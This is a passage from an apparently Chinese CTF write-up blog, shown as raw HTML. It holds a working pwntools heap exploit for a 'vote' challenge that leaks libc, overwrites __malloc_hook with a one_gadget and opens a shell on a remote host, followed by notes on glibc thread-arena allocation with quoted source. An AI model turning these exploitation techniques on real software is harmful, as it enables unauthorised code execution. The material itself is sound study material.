class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time,base64</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./vote'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./vote'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)#,'b*0x0400F6D'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.90.103.10'</span>,<span class="number">6000</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vote</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancel</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3e0</span>,<span class="string">'p4nda'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">555</span>,<span class="string">'p4nda'</span>) <span class="comment">#1</span></span><br><span class="line">cancel(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'count: '</span>)</span><br><span class="line">leak = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">libc.address = leak - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] '</span>, hex(leak)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0x71</span>)+p64(<span class="number">0x71</span>)+p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>) )<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#3</span></span><br><span class="line"><span class="comment">#add(555,'p4nda') #4</span></span><br><span class="line">cancel(<span class="number">2</span>)</span><br><span class="line">cancel(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">vote(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4n'</span>+p64(libc.address + <span class="number">0xf0274</span>))<span class="comment">#0xf02a4))#6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x50</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0274execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1117execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="null"><a href="#null" class="headerlink" title="null"></a>null</h1><p>涉及到线程堆块的分配，看了两天源代码，尽管出题人说是 <strong>a relatively easy task </strong>。 </p><p>还是记录一下线程堆块分配的姿势。</p><h1 id="线程堆块分配"><a href="#线程堆块分配" class="headerlink" title="线程堆块分配"></a>线程堆块分配</h1><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p><strong>分配区</strong> 个人理解分配区是分配内存必要的分配结构，分为主分配区和非主分配区，主分配区利用sbrk等函数分配，地址是连续的；非主分配区是不连续的，因此需要组织多个子堆块（sub-heap），对应到下面的数据结构，每一个分配区对应一个malloc_state，每一个子堆块对应一个_heap_info。分配区的数量是一定的，与操作系统位数和CPU核数有关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores + 1.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores + 1.</span><br></pre></td></tr></table></figure><p><strong>锁</strong> 锁是一个普通的变量，需要使用特殊的函数加锁解锁，为了进程间进行同步，防止发生竞争条件。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol><li><p>_heap_info</p><p><strong>仅存在于线程堆块里</strong>的数据结构，主要是标记当前sub_heap的数据信息，在线程里可以存在多个。</p><p><strong>主要原因是</strong> ：一个程序（进程）中可以包含多个进程，而各个进程的地址空间是共享的，主要就造成了其地址冲突。当主线程要求使用sbrk函数来保证堆空间是连续的时，那子线程智能使用mmap来分配堆空间。这样一来，由于mmap分配的特点，导致了线程分配的堆块是以块为单位的，如果某线程需要的堆块多的话，进程空间是不足的，再次使用mmap来分配heap时，二者并不连续，所以需要这样的数据结构来标识该块的所属和一些内存信息。</p><p>该sub_heap数据结构是单链表形式保存的，其_heap_info保存了前一个sub_heap的位置。 </p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><ol><li><p>malloc_state</p><p>对于进程堆有一些了解的同学对这个数据结构会很熟悉，一个非常常见的结构体是保存在libc库bss段的main_arena，这是主线程堆是唯一的，所以为了方便，在libc中加入了一个全局变量，而这个数据结构的目的是为了组织堆空间，如fastbin、unsorted bin、top链表的组织等等。</p><p>每一个线程有<strong>唯一</strong> 的malloc_state数据结构，即thread arena。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="结构组织"><a href="#结构组织" class="headerlink" title="结构组织"></a>结构组织</h3><ol><li><p><strong>分配区的获取</strong></p><p>可以先从malloc的代码出发，一步一步寻找分配区的生成与线程获取。首先是__libc_malloc函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure><p>malloc函数可以大致分为四部分，首先是__malloc_hook函数的检测与执行；接下来是arena_get，也就是分配区的获取；然后是_int_malloc，这个是堆块分配的主要逻辑，也是我们比较熟悉的如fastbin、unsorted bin的组织流程，它的返回值就是拟分配的堆块；最后是对拟分配堆块的一些检测。</p><p>跟踪一下arena_get函数，这是一个宏定义函数，其中，thread_arena变量是线程的全局变量，标志着最近使用过的分配区结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;      \</span><br><span class="line">      arena_lock (ptr, size);      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>继续跟踪arena_lock函数，这也是一个宏定义函数。首先，当线程曾经拥有过分配区，会尝试对该分配区加速并使用，否则执行arena_get2函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line">      <span class="keyword">if</span> (ptr &amp;&amp; !arena_is_corrupt (ptr))      \</span><br><span class="line">        (<span class="keyword">void</span>) mutex_lock (&amp;ptr-&gt;mutex);      \</span><br><span class="line">      <span class="keyword">else</span>      \</span><br><span class="line">        ptr = arena_get2 ((size), <span class="literal">NULL</span>);      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>由于我们要寻找该分配区的初始化，所以继续跟踪arena_get2：</p><p>首先，arena_get2函数调用了get_free_list()函数，猜测应该返回一个空或者一个分配区，如果成功返回了一个分配区，就直接结束；当未找到可用的分配区，就进入下面的逻辑：首先查看narenas_limit变量，应该是对于分配区个数的限制，当未初始化时，会根据内核数量及mp_areana_max进行计算。</p><p>narenas是当前分配区的个数，当不超过分配区个数时，会调用_int_new_arena生成新的分配区，否则调用reused_arena来等待服用分配区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">arena_get2 (<span class="keyword">size_t</span> size, mstate avoid_arena)</span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();</span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">int</span> n = __get_nprocs ();</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="keyword">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        a = reused_arena (avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先跟踪get_free_list函数，free_list也是一个全局变量，用于标识下一个可用的分配区，逻辑十分简单，当获取到的free_list不为空，就替换了当前线程保存的分配区，并对该分配区加锁，否则返回NULL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">get_free_list (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate replaced_arena = thread_arena;</span><br><span class="line">  mstate result = free_list;</span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">      result = free_list;</span><br><span class="line">      <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  free_list = result-&gt;next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The arena will be attached to this thread.  */</span></span><br><span class="line">  ++result-&gt;attached_threads;</span><br><span class="line"></span><br><span class="line">  detach_arena (replaced_arena);</span><br><span class="line">&#125;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_arena_reuse_free_list, <span class="number">1</span>, result);</span><br><span class="line">          (<span class="keyword">void</span>) mutex_lock (&amp;result-&gt;mutex);</span><br><span class="line">  thread_arena = result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟踪reused_arena，可以看到，程序维护了一个全局变量next_to_use，该变量初始值是&amp;main_arena，当成功获取了一个分配区后，这个变量会指向下一个分配区，也就是说分配区的使用是平均和循环的，这也避免了一个分配区被重复使用多次。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">reused_arena (mstate avoid_arena)</span><br><span class="line">&#123;</span><br><span class="line">  mstate result;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">  <span class="keyword">static</span> mstate next_to_use;</span><br><span class="line">  <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">    next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">  result = next_to_use;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!arena_is_corrupt (result) &amp;&amp; !mutex_trylock (&amp;result-&gt;mutex))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">      result = result-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Avoid AVOID_ARENA as we have already failed to allocate memory</span></span><br><span class="line"><span class="comment">     in that arena and it is currently locked.   */</span></span><br><span class="line">  <span class="keyword">if</span> (result == avoid_arena)</span><br><span class="line">    result = result-&gt;next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the arena we get is not corrupted.  */</span></span><br><span class="line">  mstate begin = result;</span><br><span class="line">  <span class="keyword">while</span> (arena_is_corrupt (result) || result == avoid_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      result = result-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (result == begin)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We could not find any arena that was either not corrupted or not the one</span></span><br><span class="line"><span class="comment">     we wanted to avoid.  */</span></span><br><span class="line">  <span class="keyword">if</span> (result == begin || result == avoid_arena)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* No arena available without contention.  Wait for the next in line.  */</span></span><br><span class="line">  LIBC_PROBE (memory_arena_reuse_wait, <span class="number">3</span>, &amp;result-&gt;mutex, result, avoid_arena);</span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;result-&gt;mutex);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">  <span class="comment">/* Attach the arena to the current thread.  Note that we may have</span></span><br><span class="line"><span class="comment">     selected an arena which was on free_list.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Update the arena thread attachment counters.   */</span></span><br><span class="line">    mstate replaced_arena = thread_arena;</span><br><span class="line">    (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">    detach_arena (replaced_arena);</span><br><span class="line">    ++result-&gt;attached_threads;</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_arena_reuse, <span class="number">2</span>, result, avoid_arena);</span><br><span class="line">  thread_arena = result;</span><br><span class="line">  next_to_use = result-&gt;next;</span><br><span 